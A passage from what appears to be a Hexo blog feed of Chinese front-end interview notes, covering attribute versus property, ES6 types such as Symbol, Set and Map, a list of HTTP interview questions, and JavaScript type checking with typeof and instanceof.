组件的时候更为重要，这样使用者就不需要通过非常复杂的优先级规则或使用<code>!important</code>的方式，去覆盖组件的样式了。</p><h6 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a><a href="https://github.com/yangshun/front-end-interview-handbook/blob/master/Translations/Chinese/questions/css-questions.md#%E5%8F%82%E8%80%83"></a>参考</h6><ul><li><a href="https://www.smashingmagazine.com/2007/07/css-specificity-things-you-should-know/">https://www.smashingmagazine.com/2007/07/css-specificity-things-you-should-know/</a></li><li><a href="https://www.sitepoint.com/web-foundations/specificity/">https://www.sitepoint.com/web-foundations/specificity/</a></li></ul><h3 id="“attribute”-和-“property”-之间有什么区别？"><a href="#“attribute”-和-“property”-之间有什么区别？" class="headerlink" title="“attribute” 和 “property” 之间有什么区别？"></a>“attribute” 和 “property” 之间有什么区别？</h3><p>“Attribute” 是在 HTML 中定义的，而 “property” 是在 DOM 上定义的。为了说明区别，假设我们在 HTML 中有一个文本框：<code>&lt;input type=&quot;text&quot; value=&quot;Hello&quot;&gt;</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const input = document.querySelector(&#x27;input&#x27;);</span><br><span class="line">console.log(input.getAttribute(&#x27;value&#x27;)); // Hello</span><br><span class="line">console.log(input.value); // Hello</span><br></pre></td></tr></table></figure><p>但是在文本框中键入“ World!”后:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(input.getAttribute(&#x27;value&#x27;)); // Hello</span><br><span class="line">console.log(input.value); // Hello World!</span><br></pre></td></tr></table></figure><h6 id="参考-4"><a href="#参考-4" class="headerlink" title="参考"></a><a href="https://github.com/yangshun/front-end-interview-handbook/blob/master/Translations/Chinese/questions/javascript-questions.md#%E5%8F%82%E8%80%83-16"></a>参考</h6><ul><li><a href="https://stackoverflow.com/questions/6003819/properties-and-attributes-in-html">https://stackoverflow.com/questions/6003819/properties-and-attributes-in-html</a></li></ul><p>——-待更新</p>]]></content>
      
      
      <categories>
          
          <category> 准备面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一道经典问题（深浅拷贝，赋值）</title>
      <link href="/Blog/2019/01/11/day_thinking/%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98%EF%BC%88%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%8C%E8%B5%8B%E5%80%BC%EF%BC%89/index/"/>
      <url>/Blog/2019/01/11/day_thinking/%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98%EF%BC%88%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%8C%E8%B5%8B%E5%80%BC%EF%BC%89/index/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blog/2019/01/11/day_thinking/%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98%EF%BC%88%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%8C%E8%B5%8B%E5%80%BC%EF%BC%89/index/img.png"></p><p><img src="/Blog/2019/01/11/day_thinking/%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98%EF%BC%88%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%8C%E8%B5%8B%E5%80%BC%EF%BC%89/index/img_1.png"></p>]]></content>
      
      
      <categories>
          
          <category> 日常杂疑 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ES6新增的数据类型</title>
      <link href="/Blog/2019/01/11/essay/ES6%E6%96%B0%E5%A2%9E%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/index/"/>
      <url>/Blog/2019/01/11/essay/ES6%E6%96%B0%E5%A2%9E%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/index/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Symbol" title="null">Symbol 类型</a><em>（基本）</em></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Set" title="null">Set 类型</a><em>（复杂）</em></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Map" title="null">Map 类型</a>（复杂）</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/WeakSet" title="null">WeakSet 类型</a><em>（复杂）</em></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/WeakMap" title="null">WeakMap 类型</a><em>（复杂）</em></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypedArray" title="null">TypedArray 类型</a><em>（复杂）</em></li></ul><p>我们再来看一看 <code>es6</code> 之前有哪些数据类型，</p><p>基本类型：</p><ul><li><code>string</code></li><li><code>null</code></li><li><code>undefined</code></li><li><code>number</code></li><li><code>boolean</code></li></ul><p>复杂类型：</p><ul><li><code>object</code></li></ul><p>由于新出的类型在平常工作中基本用不到，所以具体介绍还是直接看 <code>MDN</code> 的专业解释把，此文主要讲解面试经常遇到的一些问题….</p><h4 id="Q1：怎么让一个对象具有一个私有属性？（Symbol有什么用？）"><a href="#Q1：怎么让一个对象具有一个私有属性？（Symbol有什么用？）" class="headerlink" title="Q1：怎么让一个对象具有一个私有属性？（Symbol有什么用？）"></a>Q1：怎么让一个对象具有一个私有属性？（Symbol有什么用？）</h4><p>Answer：用 <code>Symbol</code> 作为对象的 <code>key</code> 即可</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="comment">// 私有作用域</span></span><br><span class="line">  let <span class="selector-tag">a</span> = <span class="built_in">Symbol</span>()</span><br><span class="line">  window<span class="selector-class">.oo</span> = &#123;</span><br><span class="line">    name: <span class="string">&#x27;对象&#x27;</span>,</span><br><span class="line">    age: <span class="number">18</span>,</span><br><span class="line">    <span class="selector-attr">[a]</span>: <span class="string">&#x27;这是一个私有属性&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  console<span class="selector-class">.log</span>(oo<span class="selector-attr">[a]</span>) <span class="comment">// 这是一个私有属性</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 不能再作用域外打印...</span></span><br></pre></td></tr></table></figure><p>此时对象 <code>oo</code> 就有一个私有属性，该属性在作用域外就无法正确打印。</p><p><img src="/Blog/2019/01/11/essay/ES6%E6%96%B0%E5%A2%9E%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/index/img.png"></p><h4 id="Q2：怎么快速去重一个数组？"><a href="#Q2：怎么快速去重一个数组？" class="headerlink" title="Q2：怎么快速去重一个数组？"></a>Q2：怎么快速去重一个数组？</h4><p>Answer：用 <code>Set</code> 加 <code>Array.form()</code><br>这是一道很经典的面试题，在此之前先讲讲 <code>es6</code> 之前的去重方法：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> <span class="built_in">array</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">~function uniq() &#123;</span><br><span class="line">  <span class="built_in">let</span> result = []</span><br><span class="line">  <span class="built_in">let</span> hash = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">let</span> i=<span class="number">0</span>; i&lt;<span class="built_in">array</span>.<span class="built_in">length</span>; i++) &#123;</span><br><span class="line">    hash[<span class="built_in">array</span>[i]] = <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">let</span> <span class="built_in">key</span> <span class="keyword">in</span> hash) &#123;</span><br><span class="line">    result.<span class="built_in">push</span>(<span class="built_in">key</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  console.<span class="built_in">log</span>(result)</span><br><span class="line">  <span class="built_in">return</span> result</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><p><img src="/Blog/2019/01/11/essay/ES6%E6%96%B0%E5%A2%9E%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/index/img_1.png"></p><p>但是该方法有巨大的弊端，去重数组中不能有对象，而且该方法返回的结果中都是字符串，所以无法对这样的数组进行去重。</p><p>当我们使用 <code>Set</code> 时</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let a = &#123;a: 11&#125;</span><br><span class="line">let<span class="built_in"> array </span>= [0, 1, &#x27;1&#x27;, &#x27;22&#x27;, 22, a, a, 66]</span><br><span class="line">~function uniq() &#123;</span><br><span class="line"> <span class="built_in"> return </span>Array.from(new Set(array)) // 装比写法 [...<span class="built_in"> new </span>Set(array)]</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><p><img src="/Blog/2019/01/11/essay/ES6%E6%96%B0%E5%A2%9E%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/index/img_2.png"></p><p>甚至连对象的引用也能去重，很简略的方法。</p><h4 id="Q3：Map有啥用？"><a href="#Q3：Map有啥用？" class="headerlink" title="Q3：Map有啥用？"></a>Q3：Map有啥用？</h4><p>Answer：<code>map</code> 更像是对象的拓展，他的 <code>key</code> 可以是任意类型，不再像之前的对象 <code>key</code> 只能是字符串，也就是这个特性，我们可以去优化之前的去重，但是也没有必要，因为已经有 <code>set</code> 了。<br>🌰</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myMap <span class="operator">=</span> <span class="keyword">new</span> Map()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> keyObj <span class="operator">=</span> &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> keyFunc <span class="operator">=</span> <span class="keyword">function</span> () &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> keyString <span class="operator">=</span> <span class="string">&quot;a string&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 添加键</span></span><br><span class="line">myMap.<span class="built_in">set</span>(keyString, <span class="string">&quot;和键&#x27;a string&#x27;关联的值&quot;</span>);</span><br><span class="line">myMap.<span class="built_in">set</span>(keyObj, <span class="string">&quot;和键keyObj关联的值&quot;</span>);</span><br><span class="line">myMap.<span class="built_in">set</span>(keyFunc, <span class="string">&quot;和键keyFunc关联的值&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/Blog/2019/01/11/essay/ES6%E6%96%B0%E5%A2%9E%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/index/img_3.png"></p><h4 id="Q4：WeakMap-和-Map-的区别？"><a href="#Q4：WeakMap-和-Map-的区别？" class="headerlink" title="Q4：WeakMap 和 Map 的区别？"></a>Q4：WeakMap 和 Map 的区别？</h4><p>Answer：</p><ol><li><code>WeakMap</code> 区别就是对 <code>key</code> 的引用是弱引用</li><li><code>WeakMap</code> 的 <code>key</code> 只能是对象</li></ol><p>需要了解的就是弱引用是啥了：<br>文章：<a href="https://zhuanlan.zhihu.com/p/25454328" title="null">ES2015 WeakMap的学习和使用</a></p><h4 id="Q5：WeakSet-和-Set-的区别？"><a href="#Q5：WeakSet-和-Set-的区别？" class="headerlink" title="Q5：WeakSet 和 Set 的区别？"></a>Q5：WeakSet 和 Set 的区别？</h4><p>Answer：同上</p><h4 id="Q6：TypedArray-有什么用？"><a href="#Q6：TypedArray-有什么用？" class="headerlink" title="Q6：TypedArray 有什么用？"></a>Q6：TypedArray 有什么用？</h4><p>Answer：这个类型用的途径更少了，主要用于二进制文件（音频，文件，视频，图片…）的处理，一般用不到，除非你自己开发轮子。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>回答好这些问题你才真正学好Http</title>
      <link href="/Blog/2019/01/03/essay/%E5%9B%9E%E7%AD%94%E5%A5%BD%E8%BF%99%E4%BA%9B%E9%97%AE%E9%A2%98%E4%BD%A0%E6%89%8D%E7%9C%9F%E6%AD%A3%E5%AD%A6%E5%A5%BDHttp/index/"/>
      <url>/Blog/2019/01/03/essay/%E5%9B%9E%E7%AD%94%E5%A5%BD%E8%BF%99%E4%BA%9B%E9%97%AE%E9%A2%98%E4%BD%A0%E6%89%8D%E7%9C%9F%E6%AD%A3%E5%AD%A6%E5%A5%BDHttp/index/</url>
      
        <content type="html"><![CDATA[<h2 id="初级"><a href="#初级" class="headerlink" title="初级"></a>初级</h2><hr><ul><li><h5 id="Http协议是什么？有哪些特点？"><a href="#Http协议是什么？有哪些特点？" class="headerlink" title="Http协议是什么？有哪些特点？"></a>Http协议是什么？有哪些特点？</h5></li></ul><blockquote><p><code>HTTP</code> 是一个属于<strong>应用层的面向对象的协议</strong>.<br><code>HTTP</code> 协议一共有五大特点可概括如下：<br>1.<strong>支持客户&#x2F;服务器模式</strong>。<br>2.<strong>简单快速</strong>：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有 <code>GET</code>、 <code>HEAD</code>、<code>POST</code>。每种方法规定了客户与服务器联系的类型不同。由于 <code>HTTP</code> 协议简单，使得 <code>HTTP</code> 服务器的程序规模小，因而通信速度很快。<br>3.<strong>灵活</strong>：<code>HTTP</code>允许传输任意类型的数据对象。正在传输的类型由 <code>Content-Type</code> 加以标记。<br>4.<strong>无连接</strong>：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。<br>5.<strong>无状态</strong>：<code>HTTP</code>协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。<br><a href="https://www.cnblogs.com/xuxinstyle/p/9813654.html">参考</a></p></blockquote><ul><li><h5 id="常见Http方法有哪些？使用场景分别是什么？"><a href="#常见Http方法有哪些？使用场景分别是什么？" class="headerlink" title="常见Http方法有哪些？使用场景分别是什么？"></a>常见Http方法有哪些？使用场景分别是什么？</h5></li></ul><blockquote><p><a href="https://www.cnblogs.com/susanhonly/p/8508596.html">参考</a></p></blockquote><ul><li><h5 id="GET与POST有什么区别？"><a href="#GET与POST有什么区别？" class="headerlink" title="GET与POST有什么区别？"></a>GET与POST有什么区别？</h5></li></ul><blockquote><p>同上</p></blockquote><ul><li><h5 id="在HTML的form-标签里，method支持哪些类型？"><a href="#在HTML的form-标签里，method支持哪些类型？" class="headerlink" title="在HTML的form 标签里，method支持哪些类型？"></a>在HTML的form 标签里，method支持哪些类型？</h5></li><li><h5 id="状态码-200、301、302、304、403、404、500、503分别代表什么？"><a href="#状态码-200、301、302、304、403、404、500、503分别代表什么？" class="headerlink" title="状态码 200、301、302、304、403、404、500、503分别代表什么？"></a>状态码 200、301、302、304、403、404、500、503分别代表什么？</h5></li></ul><blockquote><p><a href="https://blog.csdn.net/a6864657/article/details/80934213">参考</a><br><a href="https://blog.csdn.net/zll01/article/details/5018413">参考</a></p></blockquote><ul><li><h5 id="Web安全中有哪些常见的攻击方式？"><a href="#Web安全中有哪些常见的攻击方式？" class="headerlink" title="Web安全中有哪些常见的攻击方式？"></a>Web安全中有哪些常见的攻击方式？</h5></li></ul><blockquote><p>1.<a href="https://www.cnblogs.com/morethink/p/8734103.html#XSS">XSS</a>（关键是脚本，利用恶意脚本发起攻击）—— 存储型和反射型<br>2.<a href="https://www.cnblogs.com/morethink/p/8734103.html#SQL%E6%B3%A8%E5%85%A5">SQL注入</a>（关键是通过用SQL语句伪造参数发出攻击）<br>3.<a href="https://www.cnblogs.com/morethink/p/8734103.html#DDOS">DDOS</a>（关键是发出大量请求，最后令服务器崩溃）<br>4.<a href="https://www.cnblogs.com/morethink/p/8734103.html#CSRF">CSRF</a>（关键是借助本地cookie进行认证，伪造发送请求）<br><a href="https://www.cnblogs.com/morethink/p/8734103.html">参考</a></p></blockquote><ul><li><h5 id="URI和URL的区别？"><a href="#URI和URL的区别？" class="headerlink" title="URI和URL的区别？"></a>URI和URL的区别？</h5></li></ul><blockquote><p>“URI可以分为URL,URN或同时具备locators 和names特性的一个东西。URN作用就好像一个人的名字，URL就像一个人的地址。换句话说：URN确定了东西的身份，URL提供了找到它的方式。”<br><strong>通俗来说</strong> URI是抽象的定义，不管用什么方法表示，只要能定位一个资源，就叫URI，本来设想的的使用两种方法定位：1，URL，用地址定位；2，URN 用名称定位。<br><img src="/Blog/2019/01/03/essay/%E5%9B%9E%E7%AD%94%E5%A5%BD%E8%BF%99%E4%BA%9B%E9%97%AE%E9%A2%98%E4%BD%A0%E6%89%8D%E7%9C%9F%E6%AD%A3%E5%AD%A6%E5%A5%BDHttp/index/img.png"><br><a href="https://www.zhihu.com/question/21950864">参考</a><br><a href="http://www.cnblogs.com/hust-ghtao/p/4724885.html">参考</a></p></blockquote><ul><li><h5 id="一次完整的Http请求所经历哪些步骤？"><a href="#一次完整的Http请求所经历哪些步骤？" class="headerlink" title="一次完整的Http请求所经历哪些步骤？"></a>一次完整的Http请求所经历哪些步骤？</h5></li></ul><blockquote><p><a href="https://www.jianshu.com/p/9061e1c1cd2d">来这篇文章</a></p></blockquote><h2 id="中级"><a href="#中级" class="headerlink" title="中级"></a>中级</h2><hr><ul><li><h5 id="说说Http协议的工作流程"><a href="#说说Http协议的工作流程" class="headerlink" title="说说Http协议的工作流程"></a>说说Http协议的工作流程</h5></li><li><h5 id="Http请求报文与响应报文的格式？"><a href="#Http请求报文与响应报文的格式？" class="headerlink" title="Http请求报文与响应报文的格式？"></a>Http请求报文与响应报文的格式？</h5></li><li><h5 id="Http首部包含哪些字段？举例说明"><a href="#Http首部包含哪些字段？举例说明" class="headerlink" title="Http首部包含哪些字段？举例说明"></a>Http首部包含哪些字段？举例说明</h5></li><li><h5 id="Https的原理是什么？"><a href="#Https的原理是什么？" class="headerlink" title="Https的原理是什么？"></a>Https的原理是什么？</h5></li><li><h5 id="浅析Http和Https的三次握手有什么区别。"><a href="#浅析Http和Https的三次握手有什么区别。" class="headerlink" title="浅析Http和Https的三次握手有什么区别。"></a>浅析Http和Https的三次握手有什么区别。</h5></li><li><h5 id="谈谈Session-x2F-cookie机制，如何实现会话跟踪？"><a href="#谈谈Session-x2F-cookie机制，如何实现会话跟踪？" class="headerlink" title="谈谈Session&#x2F;cookie机制，如何实现会话跟踪？"></a>谈谈Session&#x2F;cookie机制，如何实现会话跟踪？</h5></li><li><h5 id="什么是Web缓存？原理如何？"><a href="#什么是Web缓存？原理如何？" class="headerlink" title="什么是Web缓存？原理如何？"></a>什么是Web缓存？原理如何？</h5></li><li><h5 id="OSI有哪七层模型？TCP-x2F-IP是哪四层模型。"><a href="#OSI有哪七层模型？TCP-x2F-IP是哪四层模型。" class="headerlink" title="OSI有哪七层模型？TCP&#x2F;IP是哪四层模型。"></a>OSI有哪七层模型？TCP&#x2F;IP是哪四层模型。</h5></li><li><h5 id="讲一讲TCP协议的三次握手和四次挥手流程。"><a href="#讲一讲TCP协议的三次握手和四次挥手流程。" class="headerlink" title="讲一讲TCP协议的三次握手和四次挥手流程。"></a>讲一讲TCP协议的三次握手和四次挥手流程。</h5></li><li><h5 id="为什么TCP建立连接协议是三次握手，而关闭连接却是四次握手呢？为什么不能用两次握手进行连接？"><a href="#为什么TCP建立连接协议是三次握手，而关闭连接却是四次握手呢？为什么不能用两次握手进行连接？" class="headerlink" title="为什么TCP建立连接协议是三次握手，而关闭连接却是四次握手呢？为什么不能用两次握手进行连接？"></a>为什么TCP建立连接协议是三次握手，而关闭连接却是四次握手呢？为什么不能用两次握手进行连接？</h5></li><li><h5 id="websockt是什么？和Http有什么区别？"><a href="#websockt是什么？和Http有什么区别？" class="headerlink" title="websockt是什么？和Http有什么区别？"></a>websockt是什么？和Http有什么区别？</h5></li></ul><h2 id="高级"><a href="#高级" class="headerlink" title="高级"></a>高级</h2><ul><li><h5 id="什么是非持久连接，什么是持久连接？"><a href="#什么是非持久连接，什么是持久连接？" class="headerlink" title="什么是非持久连接，什么是持久连接？"></a>什么是非持久连接，什么是持久连接？</h5></li><li><h5 id="Keep-Alive-timeout-x3D-5-max-x3D-100是什么意思？"><a href="#Keep-Alive-timeout-x3D-5-max-x3D-100是什么意思？" class="headerlink" title="Keep-Alive: timeout&#x3D;5, max&#x3D;100是什么意思？"></a>Keep-Alive: timeout&#x3D;5, max&#x3D;100是什么意思？</h5></li><li><h5 id="http1-0，http1-1，http2-0区别（HTTP1-1版本新特性？HTTP2版本新特性？）"><a href="#http1-0，http1-1，http2-0区别（HTTP1-1版本新特性？HTTP2版本新特性？）" class="headerlink" title="http1.0，http1.1，http2.0区别（HTTP1.1版本新特性？HTTP2版本新特性？）"></a>http1.0，http1.1，http2.0区别（HTTP1.1版本新特性？HTTP2版本新特性？）</h5></li><li><h5 id="对Http代理做个介绍？"><a href="#对Http代理做个介绍？" class="headerlink" title="对Http代理做个介绍？"></a>对Http代理做个介绍？</h5></li><li><h5 id="常见的鉴权方式有哪些？"><a href="#常见的鉴权方式有哪些？" class="headerlink" title="常见的鉴权方式有哪些？"></a>常见的鉴权方式有哪些？</h5></li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javascript细节总结2</title>
      <link href="/Blog/2019/01/03/day_thinking/Javascript%E7%BB%86%E8%8A%82%E6%80%BB%E7%BB%932/index/"/>
      <url>/Blog/2019/01/03/day_thinking/Javascript%E7%BB%86%E8%8A%82%E6%80%BB%E7%BB%932/index/</url>
      
        <content type="html"><![CDATA[<h3 id="1-JS-分为哪两大类型"><a href="#1-JS-分为哪两大类型" class="headerlink" title="1.JS 分为哪两大类型"></a>1.JS 分为哪两大类型</h3><p><strong>i. 原始（Primitive）类型</strong><br>在 JS 中，存在着 6 种原始值，分别是：</p><ul><li><code>boolean</code></li><li><code>null</code></li><li><code>undefined</code></li><li><code>number</code></li><li><code>string</code></li><li><code>symbol</code></li></ul><blockquote><p>首先原始类型存储的都是值，是没有函数可以调用的，比如 undefined.toString()</p></blockquote><p><img src="/Blog/2019/01/03/day_thinking/Javascript%E7%BB%86%E8%8A%82%E6%80%BB%E7%BB%932/index/img.png"></p><p>此时你肯定会有疑问，这不对呀，明明 <code>&#39;1&#39;.toString()</code> 是可以使用的。其实在这种情况下，’1’ 已经不是原始类型了，而是被强制转换成了 <code>String</code> 类型也就是对象类型，所以可以调用 <code>toString</code> 函数。</p><p>除了会在必要的情况下强转类型以外，原始类型还有一些坑。</p><p>其中 JS 的 <code>number</code> 类型是浮点类型的，在使用中会遇到某些 Bug，比如 <code>0.1 + 0.2 !== 0.3</code>。<code>string</code> 类型是不可变的，无论你在 string 类型上调用何种方法，都不会对值有改变。</p><p>另外对于 <code>null</code> 来说，很多人会认为他是个对象类型，其实这是错误的。虽然 <code>typeof null</code> 会输出 <code>object</code>，但是这只是 JS 存在的一个悠久 Bug。在 JS 的最初版本中使用的是 32 位系统，为了性能考虑使用低位存储变量的类型信息，<code>000</code> 开头代表是对象，然而 <code>null</code> 表示为全零，所以将它错误的判断为 <code>object</code> 。虽然现在的内部类型判断代码已经改变了，但是对于这个 Bug 却是一直流传下来。</p><p><strong>ii. 对象（Object）类型</strong></p><blockquote><p>在 JS 中，除了原始类型那么其他的都是对象类型了。对象类型和原始类型不同的是，原始类型存储的是值，对象类型存储的是地址。当你创建了一个对象类型的时候，计算机会在内存中帮我们开辟一个空间来存放值，但是我们需要找到这个空间，这个空间会拥有一个地址。</p></blockquote><h3 id="2-typeof-vs-instanceof"><a href="#2-typeof-vs-instanceof" class="headerlink" title="2.typeof vs instanceof"></a>2.typeof vs instanceof</h3><p><code>typeof</code> 对于原始类型来说，除了 <code>null</code> 都可以显示正确的类型</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typeof <span class="number">1</span> <span class="regexp">//</span> <span class="string">&#x27;number&#x27;</span></span><br><span class="line">typeof <span class="string">&#x27;1&#x27;</span> <span class="regexp">//</span> <span class="string">&#x27;string&#x27;</span></span><br><span class="line">typeof undefined <span class="regexp">//</span> <span class="string">&#x27;undefined&#x27;</span></span><br><span class="line">typeof true <span class="regexp">//</span> <span class="string">&#x27;boolean&#x27;</span></span><br><span class="line">typeof Symbol() <span class="regexp">//</span> <span class="string">&#x27;symbol&#x27;</span></span><br></pre></td></tr></table></figure><p><code>typeof</code> 对于对象来说，除了函数都会显示 <code>object</code>，所以说 <code>typeof</code> 并不能准确判断变量到底是什么类型</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">typeof [] <span class="regexp">//</span> <span class="string">&#x27;object&#x27;</span></span><br><span class="line">typeof &#123;&#125; <span class="regexp">//</span> <span class="string">&#x27;object&#x27;</span></span><br><span class="line">typeof console.log <span class="regexp">//</span> <span class="string">&#x27;function&#x27;</span></span><br></pre></td></tr></table></figure><p>如果我们想判断一个对象的正确类型，这时候可以考虑使用 instanceof，因为内部机制是通过原型链来判断的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Person</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line">p1 <span class="keyword">instanceof</span> <span class="title class_">Person</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line">str <span class="keyword">instanceof</span> <span class="title class_">String</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str1 = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line">str1 <span class="keyword">instanceof</span> <span class="title class_">String</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>对于原始类型来说，你想直接通过 <code>instanceof</code> 来判断类型是不行的，当然我们还是有办法让 <code>instanceof</code> 判断原始类型的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">PrimitiveString</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> [<span class="title class_">Symbol</span>.<span class="property">hasInstance</span>](x) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">typeof</span> x === <span class="string">&#x27;string&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hello world&#x27;</span> <span class="keyword">instanceof</span> <span class="title class_">PrimitiveString</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>你可能不知道 <code>Symbol.hasInstance</code> 是什么东西，其实就是一个能让我们自定义 <code>instanceof</code> 行为的东西，以上代码等同于 <code>typeof &#39;hello world&#39; === &#39;string&#39;</code>，所以结果自然是 <code>true</code> 了。这其实也侧面反映了一个问题， <code>instanceof</code> 也不是百分之百可信的。</p><h3 id="3-类型转换"><a href="#3-类型转换" class="headerlink" title="3.类型转换"></a>3.类型转换</h3><blockquote><p>首先我们要知道，在 JS 中类型转换只有三种情况，分别是：</p><ul><li>转换为布尔值</li><li>转换为数字</li><li>转换为字符串</li></ul></blockquote><p><strong>i. 转Boolean</strong><br>在条件判断时，除了 <code>undefined</code>， <code>null</code>， <code>false</code>， <code>NaN</code>， <code>&#39;</code>‘， <code>0</code>， <code>-0</code>，其他所有值都转为 <code>true</code>，包括所有对象。</p><p><strong>ii. 对象转原始类型</strong><br>对象在转换类型的时候，会调用内置的 <code>[[ToPrimitive]]</code> 函数，对于该函数来说，算法逻辑一般来说如下：</p><ul><li>如果已经是原始类型了，那就不需要转换了</li><li>调用 <code>x.valueOf()</code>，如果转换为基础类型，就返回转换的值</li><li>调用 